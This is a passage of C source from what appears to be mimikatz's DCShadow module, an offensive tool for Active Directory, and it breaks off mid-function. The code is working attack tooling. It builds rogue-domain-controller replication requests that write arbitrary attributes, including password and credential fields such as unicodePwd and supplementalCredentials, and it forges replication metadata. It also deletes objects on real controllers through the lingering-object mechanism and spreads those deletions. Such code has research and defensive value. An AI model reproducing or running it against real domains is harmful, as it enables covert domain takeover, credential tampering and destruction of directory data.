		if(!_wcsicmp(pObject->szObjectDN, szObject))
		{
			for(j = 0; j < pObject->cbAttributes; j++)
			{
				pAttribute = pObject->pAttributes + i;
				if(!_wcsicmp(pAttribute->pAttribute->szAttributeName, szAttribute))
				{
					if(pObject->cbAttributes == 1)
						return kuhl_m_lsadump_dcshadow_remove_object(request, szObject);
					for(k = 0; k < pAttribute->AttrVal.valCount; k++)
						LocalFree(pAttribute->pszValue[k]);
					LocalFree(pAttribute->pszValue);
					RtlCopyMemory(pAttribute, pObject->pAttributes + pObject->cbAttributes -1, sizeof(DCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE));
					pObject->pAttributes--;
					return TRUE;
				}
			}
			return FALSE;
		}
	}
	return FALSE;
}


BOOL kuhl_m_lsadump_dcshadow_encode_attribute(PDCSHADOW_PUSH_REQUEST request, PCWSTR szAttribute, PDCSHADOW_OBJECT_ATTRIBUTE *pProperty)
{
	DWORD i, j;
	PDCSHADOW_OBJECT_ATTRIBUTE oldAttributes;
	ULONG_PTR pt_dif;

	for(i = 0; i < request->cNumAttributes; i++)
	{
		if(!_wcsicmp(request->pAttributes[i].szAttributeName, szAttribute))
		{
			*pProperty = request->pAttributes + i;
			return TRUE;
		}
	}

	oldAttributes = request->pAttributes;
	request->pAttributes = (PDCSHADOW_OBJECT_ATTRIBUTE) LocalAlloc(LPTR, sizeof(DCSHADOW_OBJECT_ATTRIBUTE) * (request->cNumAttributes+1));
	if(!request->pAttributes)
	{
		request->pAttributes = oldAttributes;
		return FALSE;
	}
	RtlCopyMemory(request->pAttributes, oldAttributes, sizeof(DCSHADOW_OBJECT_ATTRIBUTE) * request->cNumAttributes);
	if(oldAttributes)
		LocalFree(oldAttributes);
	pt_dif = (ULONG_PTR) request->pAttributes - (ULONG_PTR) oldAttributes;
	for(i = 0; i < request->cNumObjects; i++)
		for(j = 0; j < request->pObjects[i].cbAttributes; j++)
			request->pObjects[i].pAttributes[j].pAttribute = (PDCSHADOW_OBJECT_ATTRIBUTE) ((ULONG_PTR) request->pObjects[i].pAttributes[j].pAttribute + pt_dif);
	*pProperty = request->pAttributes + request->cNumAttributes;

	if(!kull_m_string_copy(&((*pProperty)->szAttributeName), szAttribute))
		return FALSE;

	request->cNumAttributes++;
	if(_wcsicmp(szAttribute, L"unicodePwd") == 0 ||
		_wcsicmp(szAttribute, L"currentValue") == 0 ||
		_wcsicmp(szAttribute, L"dBCSPwd") == 0 ||
		_wcsicmp(szAttribute, L"initialAuthIncoming") == 0 ||
		_wcsicmp(szAttribute, L"lmPwdHistory") == 0 ||
		_wcsicmp(szAttribute, L"ntPwdHistory") == 0 ||
		_wcsicmp(szAttribute, L"priorValue") == 0 ||
		_wcsicmp(szAttribute, L"supplementalCredentials") == 0 ||
		_wcsicmp(szAttribute, L"trustAuthIncoming") == 0 ||
		_wcsicmp(szAttribute, L"trustAuthOutgoing") == 0)
	{
		(*pProperty)->fIsSensitive = TRUE;
	}
	return TRUE;
}

BOOL kuhl_m_lsadump_dcshadow_encode_add_object_if_needed(PDCSHADOW_PUSH_REQUEST request, PCWSTR szObject,PDCSHADOW_PUSH_REQUEST_OBJECT* ppObject)
{
	DWORD i;
	PDCSHADOW_PUSH_REQUEST_OBJECT pOldObjects;
	
	if(request->cNumObjects != 0)
	{
		for(i = 0; i < request->cNumObjects; i++)
		{
			PDCSHADOW_PUSH_REQUEST_OBJECT pObject = request->pObjects + i;
			if(_wcsicmp(pObject->szObjectDN, szObject) == 0)
			{
				*ppObject = pObject;
				return TRUE;
			}
		}
	}
	pOldObjects = request->pObjects;
	request->pObjects = (PDCSHADOW_PUSH_REQUEST_OBJECT) LocalAlloc(LPTR, sizeof(DCSHADOW_PUSH_REQUEST_OBJECT) * (request->cNumObjects+1));
	if(request->pObjects)
	{
		*ppObject = request->pObjects + request->cNumObjects;
		if(kull_m_string_copy(&((*ppObject)->szObjectDN), szObject))
		{
			RtlCopyMemory(request->pObjects, pOldObjects, sizeof(DCSHADOW_PUSH_REQUEST_OBJECT) * request->cNumObjects);
			request->cNumObjects ++;
			return TRUE;
		}
		LocalFree(request->pObjects);
	}
	request->pObjects = pOldObjects;
	return FALSE;
}

BOOL kuhl_m_lsadump_dcshadow_encode_add_attribute_if_needed(PDCSHADOW_PUSH_REQUEST request, PCWSTR szAttribute,PDCSHADOW_PUSH_REQUEST_OBJECT pObject, PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE *ppAttribute)
{
	DWORD i;
	PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE pOldProperties;
	
	if(pObject->cbAttributes != 0)
	{
		for(i = 0; i < pObject->cbAttributes; i++)
		{
			PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE pAttribute = pObject->pAttributes + i;
			if(_wcsicmp(pAttribute->pAttribute->szAttributeName, szAttribute) == 0)
			{
				*ppAttribute = pAttribute;
				return TRUE;
			}
		}
	}
	pOldProperties = pObject->pAttributes;
	pObject->pAttributes = (PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE) LocalAlloc(LPTR, sizeof(DCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE) * (pObject->cbAttributes+1));
	if(pObject->pAttributes)
	{
		RtlCopyMemory(pObject->pAttributes, pOldProperties, sizeof(DCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE) * pObject->cbAttributes);
		*ppAttribute = pObject->pAttributes + pObject->cbAttributes;
		if(kuhl_m_lsadump_dcshadow_encode_attribute(request, szAttribute, &((*ppAttribute)->pAttribute)))
		{
			pObject->cbAttributes ++;
			return TRUE;
		}
		LocalFree(pObject->pAttributes);
	}
	pObject->pAttributes = pOldProperties;
	return FALSE;
}

BOOL kuhl_m_lsadump_dcshadow_encode_add_value(PCWSTR szValue, PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE pAttribute, BOOL fAddMultipleValues)
{
	DWORD dwNewCb = (fAddMultipleValues ? pAttribute->AttrVal.valCount+1 : 1);
	PWSTR* pszOldValues = pAttribute->pszValue;
	
	pAttribute->pszValue = (PWSTR *) LocalAlloc(LPTR, sizeof(PWSTR) * (dwNewCb));
	if(pAttribute->pszValue)
	{
		if(kull_m_string_copy(pAttribute->pszValue + dwNewCb-1, szValue))
		{
			if(fAddMultipleValues && pAttribute->AttrVal.valCount)
				RtlCopyMemory(pAttribute->pszValue, pszOldValues, sizeof(PWSTR) * pAttribute->AttrVal.valCount);
			pAttribute->AttrVal.valCount = dwNewCb;
			if(pszOldValues)
				LocalFree(pszOldValues);
			return TRUE;
		}
		else
			LocalFree(pAttribute->pszValue);
	}
	pAttribute->pszValue = pszOldValues;
	return FALSE;
}

NTSTATUS kuhl_m_lsadump_dcshadow_encode(PDCSHADOW_PUSH_REQUEST request, int argc, wchar_t * argv[])
{
	LPCWSTR szObject, szAttribute, szValue = NULL, szSid = NULL, szReplOriginatingUid = NULL, szReplOriginatingUsn = NULL, szReplOriginatingTime = NULL;
	PDCSHADOW_PUSH_REQUEST_OBJECT pObject;
	PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE pAttribute;
	BOOL cleanData = kull_m_string_args_byName(argc, argv, L"clean", NULL, NULL), multipleValues = kull_m_string_args_byName(argc, argv, L"multiple", NULL, NULL);
	UNICODE_STRING us;


	if(kull_m_string_args_byName(argc, argv, L"object", &szObject, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"attribute", &szAttribute, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, L"value", &szValue, NULL))
			{
				if(kuhl_m_lsadump_dcshadow_encode_add_object_if_needed(request, szObject, &pObject))
				{
					if(kuhl_m_lsadump_dcshadow_encode_add_attribute_if_needed(request, szAttribute, pObject, &pAttribute))
					{
						if(kuhl_m_lsadump_dcshadow_encode_add_value(szValue, pAttribute, multipleValues))
						{
							if(kull_m_string_args_byName(argc, argv, L"replOriginatingUid", &szReplOriginatingUid, NULL))
							{
								RtlInitUnicodeString(&us, szReplOriginatingUid);
								if(NT_SUCCESS(RtlGUIDFromString(&us, &(pAttribute->MetaData.uidOriginatingDsa))))
									pAttribute->MetaData.dwFlag |= REPLICATION_UID_SET;
								else PRINT_ERROR(L"unable parse replOriginatingUid\n");
							}
							if(kull_m_string_args_byName(argc, argv, L"replOriginatingUsn", &szReplOriginatingUsn, NULL))
							{
								pAttribute->MetaData.usnOriginating = wcstoul(szReplOriginatingUsn, NULL, 0);
								pAttribute->MetaData.dwFlag |= REPLICATION_USN_SET;
							}
							if(kull_m_string_args_byName(argc, argv, L"replOriginatingTime", &szReplOriginatingTime, NULL))
							{
								if(kull_m_string_stringToFileTime(szReplOriginatingTime, &pAttribute->MetaData.usnTimeChanged))
									pAttribute->MetaData.dwFlag |= REPLICATION_TIME_SET;
								else PRINT_ERROR(L"unable parse replOriginatingTime\n");
							}
							if(kull_m_string_args_byName(argc, argv, L"dynamic", NULL, NULL))
							{
								pObject->dwFlag |= OBJECT_DYNAMIC;
							}
						}
						else PRINT_ERROR(L"unable to set value\n");
					}
					else PRINT_ERROR(L"unable to add attribute\n");
				}
				else PRINT_ERROR(L"unable to add object\n");
			}
			else if(cleanData)
			{
				if(!kuhl_m_lsadump_dcshadow_remove_attribute(request, szObject, szAttribute))
					PRINT_ERROR(L"object or attribute not found\n");
			}
			else PRINT_ERROR(L"value missing\n");
		}
		else if(cleanData)
		{
			if(!kuhl_m_lsadump_dcshadow_remove_object(request, szObject))
				PRINT_ERROR(L"object not found\n");
		}
		else PRINT_ERROR(L"attribute missing\n");
	}
	else
	{
		if(cleanData)
			kuhl_m_lsadump_dcshadow_clean_push_request(request);
		else PRINT_ERROR(L"object missing\n");
	}
	return ERROR_SUCCESS;
}

NTSTATUS kuhl_m_lsadump_dcshadow_view(PDCSHADOW_PUSH_REQUEST request)
{
	DWORD i, j, k;
	for(i = 0; i < request->cNumObjects; i++)
	{
		kprintf(L"[%u] Object DN: %s\n", i, request->pObjects[i].szObjectDN);
		for(j = 0; j < request->pObjects[i].cbAttributes; j++)
		{
			kprintf(L"  [%u] Attribute: %s\n", j, request->pObjects[i].pAttributes[j].pAttribute->szAttributeName);
			if(request->pObjects[i].pAttributes[j].AttrVal.valCount == 0)
				kprintf(L"  Attribute is empty (existing value will be removed)\n");
			else for(k = 0; k < request->pObjects[i].pAttributes[j].AttrVal.valCount; k++)
					kprintf(L"    [%u] %s\n", k, request->pObjects[i].pAttributes[j].pszValue[k]);
		}
	}
	return STATUS_SUCCESS;
}


PBERVAL kuhl_m_lsadump_dcshadow_getSingleAttr(PLDAP ld, PLDAPMessage pMessage, PCWCHAR attr)
{
	PBERVAL *tmp, result = NULL;
	if(tmp = ldap_get_values_len(ld, pMessage, (PWCHAR) attr))
	{
		if(ldap_count_values_len(tmp) == 1)
		{
			if(result = (PBERVAL) LocalAlloc(LPTR, sizeof(BERVAL)))
			{
				result->bv_len = tmp[0]->bv_len;
				if(result->bv_val = (PCHAR) LocalAlloc(LPTR, result->bv_len))
					RtlCopyMemory(result->bv_val, tmp[0]->bv_val, result->bv_len);
				else result = (PBERVAL) LocalFree(result);
			}
		}
		ldap_value_free_len(tmp);
	}
	return result;
}

PWCHAR kuhl_m_lsadump_dcshadow_getSingleTextAttr(PLDAP ld, PLDAPMessage pMessage, PCWCHAR attr)
{
	PWCHAR *tmp, result = NULL;
	if(tmp = ldap_get_values(ld, pMessage, (PWCHAR) attr))
	{
		if(ldap_count_values(tmp) == 1)
			kull_m_string_copy(&result, tmp[0]);
		ldap_value_free(tmp);
	}
	return result;
}

PSTR kuhl_m_lsadump_dcshadow_getSingleTextAttrA(PLDAP ld, PLDAPMessage pMessage, PCSTR attr)
{
	PSTR *tmp, result = NULL;
	
	if(tmp = ldap_get_valuesA(ld, pMessage, (PSTR) attr))
	{
		if(ldap_count_valuesA(tmp) == 1)
			kull_m_string_copyA(&result, tmp[0]);
		ldap_value_freeA(tmp);
	}
	return result;
}

BOOL kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(PDCSHADOW_DOMAIN_INFO info, PWSTR szComputerDns, PDCSHADOW_DOMAIN_DC_INFO pInfo)
{
	DWORD dwErr;
	PWCHAR serverAttr[] = {L"objectGUID", L"invocationId", L"msDS-ReplicationEpoch", NULL}, sitesBase, sitesFilter, serverBase, szEpoch;
	PLDAPMessage pSitesMessage = NULL, pServerMessage = NULL;
	PBERVAL res;
	
	RtlZeroMemory(pInfo, sizeof(DCSHADOW_DOMAIN_DC_INFO));
	if(kull_m_string_sprintf(&sitesBase, L"CN=Sites,%s", info->szConfigurationNamingContext))
	{
		if(kull_m_string_sprintf(&sitesFilter, L"(&(objectClass=server)(dNSHostName=%s))", szComputerDns))
		{
			dwErr = ldap_search_sW(info->ld, sitesBase, LDAP_SCOPE_SUBTREE, sitesFilter, NULL, FALSE, &pSitesMessage);
			if(dwErr == LDAP_SUCCESS)
			{
				if(ldap_count_entries(info->ld, pSitesMessage) == 1)
				{
					if(serverBase = ldap_get_dnW(info->ld, pSitesMessage))
					{
						dwErr = ldap_search_sW(info->ld, serverBase, LDAP_SCOPE_ONELEVEL, L"(name=NTDS Settings)", serverAttr, FALSE, &pServerMessage);
						if(dwErr == LDAP_SUCCESS)
						{
							if(ldap_count_entries(info->ld, pServerMessage) == 1)
							{
								if(res = kuhl_m_lsadump_dcshadow_getSingleAttr(info->ld, pServerMessage, serverAttr[0]))
								{
									if(res->bv_len == sizeof(GUID))
									{
										RtlCopyMemory(&pInfo->InstanceId, res->bv_val, sizeof(GUID));
										pInfo->isInstanceId = TRUE;
									}
									if(res->bv_val)
										LocalFree(res->bv_val);
									LocalFree(res);
								}
								else PRINT_ERROR(L"No %s attribute for %s server\n", serverAttr[0], szComputerDns);
								
								if(res = kuhl_m_lsadump_dcshadow_getSingleAttr(info->ld, pServerMessage, serverAttr[1]))
								{
									if(res->bv_len == sizeof(GUID))
									{
										RtlCopyMemory(&pInfo->InvocationId, res->bv_val, sizeof(GUID));
										pInfo->isInvocationId = TRUE;
									}
									if(res->bv_val)
										LocalFree(res->bv_val);
									LocalFree(res);
								}
								else PRINT_ERROR(L"No %s attribute for %s server\n", serverAttr[1], szComputerDns);

								if(szEpoch = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pServerMessage, serverAttr[2]))
								{
									info->dwReplEpoch = wcstoul(szEpoch, NULL, 10);
									LocalFree(szEpoch);
								}
							}
							else PRINT_ERROR(L"ldap_count_entries is NOT 1\n");
						}
						else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);
						if(pServerMessage)
							ldap_msgfree(pServerMessage);
						ldap_memfreeW(serverBase);
					}
				}
				//else PRINT_ERROR(L"ldap_count_entries is NOT 1\n");
			}
			else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);
			if(pSitesMessage)
				ldap_msgfree(pSitesMessage);
			LocalFree(sitesFilter);
		}
		LocalFree(sitesBase);
	}
	return (pInfo->isInstanceId && pInfo->isInvocationId);
}

BOOL kuhl_m_lsadump_dcshadow_build_convert_account_to_dn(PLDAP ld, PWSTR szDomainNamingContext, PDCSHADOW_PUSH_REQUEST_OBJECT object)
{
	BOOL status = FALSE; 
	DWORD dwErr;
	PLDAPMessage pMessage = NULL;
	PWSTR szFilter, szDN;
	
	if(kull_m_string_sprintf(&szFilter, L"(sAMAccountName=%s)", object->szObjectDN))
	{
		dwErr = ldap_search_s(ld, szDomainNamingContext, LDAP_SCOPE_SUBTREE, szFilter, NULL, FALSE, &pMessage);
		if(dwErr == LDAP_SUCCESS)
		{
			if(szDN = ldap_get_dnW(ld, pMessage))
			{
				LocalFree(object->szObjectDN);
				if(kull_m_string_copy(&object->szObjectDN, szDN))
					status = TRUE;
			}
			ldap_msgfree(pMessage);
		}
		LocalFree(szFilter);
	}
	return status;
}

BOOL kuhl_m_lsadump_dcshadow_build_parentGuid_from_dn(PLDAP ld, PWSTR szObjectDN, GUID* pParentGuid)
{
	BOOL fSuccess = FALSE;
	PWSTR szParentDN;
	DWORD dwErr, len, i;
	WCHAR** szrdns;
	PWCHAR replAttr[] = {L"objectGUID", NULL};
	PBERVAL *guid;
	PLDAPMessage pMessage = NULL;

	if (wcsncmp(szObjectDN, L"DC=", 3) == 0)
	{
		RtlZeroMemory(pParentGuid, sizeof(GUID));
		return TRUE;
	}

	if ((szrdns = ldap_explode_dn(szObjectDN, 0)) ==  NULL)
	{
		PRINT_ERROR(L"Unable to parse DN (%s)\n", szObjectDN);
		return FALSE;
	}
	len = 1;
	for(i = 1; szrdns[i] != NULL; i++)
	{
		len += (2 + lstrlenW(szrdns[i]));
	}
	szParentDN = (PWSTR) LocalAlloc(LPTR, len * sizeof(WCHAR));
	if (szParentDN)
	{
		for(i = 1; szrdns[i] != NULL; i++)
		{
			if (i > 1)
				wcscat_s(szParentDN, len, L",");
			wcscat_s(szParentDN, len, szrdns[i]);
		}
	}
	ldap_value_free(szrdns);
	if (!szParentDN)
		return FALSE;

	dwErr = ldap_search_s(ld, szParentDN, LDAP_SCOPE_BASE, L"(objectclass=*)", replAttr, FALSE, &pMessage);
	if(dwErr == LDAP_SUCCESS)
	{
		if((guid = ldap_get_values_len(ld, pMessage, replAttr[0])) != NULL && ((*guid)->bv_len == sizeof(GUID)))
		{
			RtlCopyMemory(pParentGuid, (*guid)->bv_val, (*guid)->bv_len);
			fSuccess = TRUE;
			ldap_value_free_len(guid);
		}
		ldap_msgfree(pMessage);
	}
	else
	{
		PRINT_ERROR(L"Parent DN (%s) not found\n", szParentDN);
	}
	LocalFree(szParentDN);
	return fSuccess;
}

BOOL kuhl_m_lsadump_dcshadow_build_replication_version(PLDAP ld, PWSTR szDomainNamingContext, PDCSHADOW_PUSH_REQUEST_OBJECT object)
{
	BOOL status = FALSE; 

	DWORD dwErr, i, j;
	ATTRTYP attr;
	PWCHAR replAttr[] = {L"replPropertyMetaData", L"objectSid", L"objectGUID", L"parentGUID", NULL};
	PLDAPMessage pMessage = NULL;
	PBERVAL res, *sid, *guid, *parentguid;
	PDS_REPL_OBJ_TYPE_META_DATA_BLOB blob;
	// LDAP_SERVER_SHOW_DELETED_OID
	LDAPControl deletedControl = {TEXT(szOID_ldapServer_show_deleted), 0};
	PLDAPControl controls[] = {&deletedControl, NULL};
	LDAP_TIMEVAL timeout = {60,0};
	dwErr = ldap_search_ext_s(ld, object->szObjectDN, LDAP_SCOPE_BASE, L"(objectclass=*)", replAttr, FALSE, controls, NULL, &timeout, 1000, &pMessage);
	
	if(dwErr == LDAP_SUCCESS)
	{
		if(ldap_count_entries(ld, pMessage) == 1)
		{
			if(res = kuhl_m_lsadump_dcshadow_getSingleAttr(ld, pMessage, replAttr[0]))
			{
				blob = (PDS_REPL_OBJ_TYPE_META_DATA_BLOB) res->bv_val;
				if(status = (blob->dwVersion == 1))
				{
					for(i = 0; i < object->cbAttributes; i++)
					{
						if(kull_m_rpc_drsr_MakeAttid((SCHEMA_PREFIX_TABLE *) &SCHEMA_DEFAULT_PREFIX_TABLE, object->pAttributes[i].pAttribute->Oid, &attr, FALSE))
						{
							for(j = 0; j < blob->ctr.cNumEntries; j++)
							{
								if(attr == blob->ctr.rgMetaData[j].attrType)
								{
									object->pAttributes[i].MetaData.curRevision = blob->ctr.rgMetaData[j].dwVersion;
									// ftimeLastOriginatingChange is not a fileTime
									*((PLONGLONG)&object->pAttributes[i].MetaData.curTimeChanged) = *((PLONGLONG) &blob->ctr.rgMetaData[j].ftimeLastOriginatingChange) * 10000000;
									break;
								}
							}
						}
						else PRINT_ERROR(L"Unable to MakeAttid from SCHEMA_DEFAULT_PREFIX_TABLE for Oid: %S, version(%u) can be problematic\n", object->pAttributes[i].pAttribute->Oid, object->pAttributes[i].MetaData.curRevision);
					}
				}
				else PRINT_ERROR(L"Repl Blob version is not 1 (%u)\n", blob->dwVersion);
				if(res->bv_val)
					LocalFree(res->bv_val);
				LocalFree(res);
			}
			if((sid = ldap_get_values_len(ld, pMessage, replAttr[1])) != NULL && ((*sid)->bv_len <= sizeof(NT4SID)))
			{
				RtlCopyMemory(&object->pSid, (*sid)->bv_val, (*sid)->bv_len);
				ldap_value_free_len(sid);
			}
			if((guid = ldap_get_values_len(ld, pMessage, replAttr[2])) != NULL && ((*guid)->bv_len == sizeof(GUID)))
			{
				RtlCopyMemory(&object->ObjectGUID, (*guid)->bv_val, (*guid)->bv_len);
				ldap_value_free_len(guid);
			}
			if((parentguid = ldap_get_values_len(ld, pMessage, replAttr[3])) != NULL && ((*parentguid)->bv_len == sizeof(GUID)))
			{
				RtlCopyMemory(&object->ParentGuid, (*parentguid)->bv_val, (*parentguid)->bv_len);
				ldap_value_free_len(parentguid);
			}
		}
	}
	else if(dwErr == LDAP_NO_SUCH_OBJECT)
	{
		status = TRUE;
		kprintf(L"Object does not exist\n");
		object->dwFlag |= OBJECT_TO_ADD;
		kuhl_m_lsadump_dcshadow_build_parentGuid_from_dn(ld, object->szObjectDN, &object->ParentGuid);
	}
	else if(dwErr == LDAP_INVALID_DN_SYNTAX)
	{
		// an account name ?
		if(kuhl_m_lsadump_dcshadow_build_convert_account_to_dn(ld, szDomainNamingContext, object))
		{
			kprintf(L"DN:%s\n", object->szObjectDN);
			status = kuhl_m_lsadump_dcshadow_build_replication_version(ld, szDomainNamingContext, object);
		}
	}
	else 
	{
		PWCHAR pServerError;
		PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);
		if(dwErr = ldap_get_option(ld,LDAP_OPT_SERVER_ERROR,(void*)&pServerError) == 0)
		{
			PRINT_ERROR(L"ldap_search_s %s\n", pServerError);
			ldap_memfree(pServerError);
		}
	}
	if(pMessage)
		ldap_msgfree(pMessage);
	return status;
}

const PCWSTR SZ_DOMAIN_CONTROLLER_FUNCTIONALITY[] = {L"WIN2000", L"WIN2003 interim", L"WIN2003", L"WIN2008", L"WIN2008R2", L"WIN2012", L"WIN2012R2", L"WIN2016"};
BOOL kuhl_m_lsadump_dcshadow_domaininfo_rootDse(PDCSHADOW_DOMAIN_INFO info)
{
	DWORD dwErr;
	PWCHAR rootAttr[] = {L"rootDomainNamingContext", L"configurationNamingContext", L"schemaNamingContext", L"dsServiceName", L"domainControllerFunctionality", L"highestCommittedUSN", NULL};
	PLDAPMessage pMessage = NULL;
	PWCHAR tmp, p;
	
	dwErr = ldap_search_s(info->ld, NULL, LDAP_SCOPE_BASE, NULL, rootAttr, FALSE, &pMessage);
	if(dwErr == LDAP_SUCCESS)
	{
		if(ldap_count_entries(info->ld, pMessage) == 1)
		{
			if(info->szDomainNamingContext = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pMessage, rootAttr[0]))
				kprintf(L"Domain:         %s\n", info->szDomainNamingContext);
			if(info->szConfigurationNamingContext = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pMessage, rootAttr[1]))
				kprintf(L"Configuration:  %s\n", info->szConfigurationNamingContext);
			if(info->szSchemaNamingContext = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pMessage, rootAttr[2]))
				kprintf(L"Schema:         %s\n", info->szSchemaNamingContext);
			if(info->szDCDsServiceName = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pMessage, rootAttr[3]))
			{
				p = wcsstr(info->szDCDsServiceName, L",CN=");
				if(p)
				{
					p = wcsstr(p + 1, L",CN=");
					if(p && (p + 1) && kull_m_string_copy(&info->szDsServiceName, p));
						kprintf(L"dsServiceName:  %s\n", info->szDsServiceName);
				}
			}
			if(tmp = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pMessage, rootAttr[4]))
			{
				info->dwDomainControllerFunctionality = wcstoul(tmp, NULL, 10);
				LocalFree(tmp);
			}
			kprintf(L"domainControllerFunctionality: %u ( %s )\n", info->dwDomainControllerFunctionality, (info->dwDomainControllerFunctionality < ARRAYSIZE(SZ_DOMAIN_CONTROLLER_FUNCTIONALITY) ? SZ_DOMAIN_CONTROLLER_FUNCTIONALITY[info->dwDomainControllerFunctionality] : L"?"));
			if(tmp = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pMessage, rootAttr[5]))
			{
				info->maxDCUsn = wcstoul(tmp, NULL, 10);
				LocalFree(tmp);
			}
			kprintf(L"highestCommittedUSN: %u\n", info->maxDCUsn);
		}
		else PRINT_ERROR(L"ldap_count_entries is NOT 1\n");
		ldap_msgfree(pMessage);
	}
	else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);	
	return (dwErr == LDAP_SUCCESS) && info->szDomainNamingContext && info->szConfigurationNamingContext && info->szSchemaNamingContext && info->szDsServiceName;
}

BOOL kuhl_m_lsadump_dcshadow_domaininfo_schemasignature(PDCSHADOW_DOMAIN_INFO info)
{
	DWORD dwErr;
	PWSTR szAttributes[] = {TEXT("schemaInfo"), NULL};
	PLDAPMessage pMessage = NULL;
	struct berval** berSchemaInfo = NULL;
	
	dwErr = ldap_search_s(info->ld, info->szSchemaNamingContext, LDAP_SCOPE_BASE, NULL, szAttributes, FALSE, &pMessage);
	if(dwErr == LDAP_SUCCESS)
	{
		berSchemaInfo = ldap_get_values_len(info->ld, pMessage,szAttributes[0]);
		if(!berSchemaInfo || (*berSchemaInfo)->bv_len != 21)
		{
			// default signature
			info->pbSchemaSignature[0] = 0xFF;
			RtlZeroMemory(info->pbSchemaSignature + 1, 20);
		}
		else
			RtlCopyMemory(info->pbSchemaSignature, (*berSchemaInfo)->bv_val, 21);
		ldap_msgfree(pMessage);
		kprintf(L"schema signature:");
		kull_m_string_wprintf_hex(info->pbSchemaSignature, 21, 0);
		kprintf(L"\n");
	}
	return (dwErr == LDAP_SUCCESS);
}

BOOL kuhl_m_lsadump_dcshadow_domaininfo_computer(PDCSHADOW_DOMAIN_INFO info)
{
	DWORD dwErr;
	PWSTR szComputerFilter, szTempComputerDN;
	PWSTR szComputerAttributes[] = {L"distinguishedName",L"userAccountControl", L"dNSHostName", NULL};
	LDAPMessage *pComputerSearchResult = NULL;

	if(kull_m_string_sprintf(&szComputerFilter, L"(&(|(objectClass=user)(objectClass=computer))(sAMAccountName=%s$))", info->szFakeDCNetBIOS))
	{
		// search for computer info in LDAP
		if(!(dwErr = ldap_search_s(info->ld, info->szDomainNamingContext, LDAP_SCOPE_SUBTREE, szComputerFilter, szComputerAttributes, FALSE, &pComputerSearchResult)))
		{
			szTempComputerDN = ldap_get_dn(info->ld,pComputerSearchResult);
			kull_m_string_copy(&info->szFakeDN, szTempComputerDN);
			ldap_memfree(szTempComputerDN);
			info->szFakeFQDN  = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pComputerSearchResult, L"dNSHostName");
			ldap_msgfree(pComputerSearchResult);
		}
		else PRINT_ERROR(L"computer not found in AD 0x%x (%u)\n", dwErr, dwErr);
	}
	return info->szFakeFQDN && info->szFakeDN;
}

ULONG kuhl_m_lsadump_dcshadow_init_ldap(PWSTR szFQDN, LDAP** pld)
{
	DWORD dwErr = 0;
	LDAP* ld;
	if(ld = ldap_init(szFQDN, 389))
	{
		ULONG version = LDAP_VERSION3;
		// Set the version to 3.0 (default is 2.0).
		ldap_set_option(ld,LDAP_OPT_PROTOCOL_VERSION,(void*) &version);
		// enable LDAP signing - survive policies "network security: LDAP client signing requirements" + "domain controller: LDAP server signing requirements"
		ldap_set_option(ld,LDAP_OPT_SIGN,LDAP_OPT_ON);
		// ready to be enabled:
		//ldap_set_option(ld,LDAP_OPT_ENCRYPT,LDAP_OPT_ON);

		if(!(dwErr = ldap_connect(ld, NULL)))
		{
			if(!(dwErr = ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE)))
			{
				*pld = ld;
			}
			else ldap_unbind(ld);
		}
		else ldap_unbind(ld);
	}
	return dwErr;
}

ULONG kuhl_m_lsadump_dcshadow_lingering_trigger(LDAP* ld, PWSTR szTargetNTDS, PWSTR szObject)
{
	DWORD dwErr;
	PWSTR szMod[] = {NULL, NULL};
	LDAPMod Modification = {LDAP_MOD_REPLACE , L"removeLingeringObject", szMod};
	PLDAPMod pModification[] = {&Modification, NULL};

	if(kull_m_string_sprintf(szMod, L"%s:%s", szTargetNTDS, szObject))
	{
		if (dwErr = ldap_modify_s(ld, L"", pModification))
			PRINT_ERROR(L"removeLingeringObject 0x%x (%u)\n", dwErr, dwErr);
		LocalFree(szMod[0]);
	}
	return dwErr;
}

// delete the object on the target DC by telling this is a lingering object and by leveraging the fake DC
NTSTATUS kuhl_m_lsadump_dcshadow_lingering_initial(PDCSHADOW_DOMAIN_INFO info, PWSTR szObjectToKill)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PWSTR szTargetNTDS;
	if(kull_m_string_sprintf(&szTargetNTDS, L"CN=NTDS Settings,CN=%s%s", info->szFakeDCNetBIOS, info->szDsServiceName))
	{
		status = kuhl_m_lsadump_dcshadow_lingering_trigger(info->ld, szTargetNTDS, szObjectToKill);
		LocalFree(szTargetNTDS);
	}
	return status;
}

// use the target DC as reference (object is deleted) and tell others that their objects are lingering ones based on the target DC info
NTSTATUS kuhl_m_lsadump_dcshadow_lingering_propagate(PDCSHADOW_DOMAIN_INFO info, PWSTR szObjectToKill)
{
	DWORD dwErr;
	PLDAPMessage pMessage = NULL, pEntry, pServerMessage;
	PWSTR szNTDSADn;
	PWSTR szServerDN, szServerFQDN;
	LDAP* ld;
	PWSTR szAttributes[] = {L"dNSHostName", NULL};
	dwErr = ldap_search_s(info->ld, info->szConfigurationNamingContext, LDAP_SCOPE_SUBTREE, L"(objectClass=nTDSDSA)", NULL, FALSE, &pMessage);
	if(dwErr == LDAP_SUCCESS)
	{
		pEntry = pMessage;
		while(pEntry != NULL)
